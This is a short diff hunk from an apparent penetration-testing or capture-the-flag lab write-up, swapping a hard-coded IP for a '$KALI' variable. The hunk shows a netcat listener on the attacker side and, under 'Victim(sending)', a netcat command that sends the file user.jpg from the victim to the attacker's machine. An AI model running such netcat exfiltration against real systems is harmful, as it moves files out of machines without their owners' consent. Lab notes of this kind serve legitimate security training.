@@ -27,6 +27,6 @@ nc -l -p 1234 > user.jpg
 **Victim(sending)**
 
 ```
-nc -w 3 10.10.154.80 1234 < user.jpg
+nc -w 3 $KALI 1234 < user.jpg
 ```
 
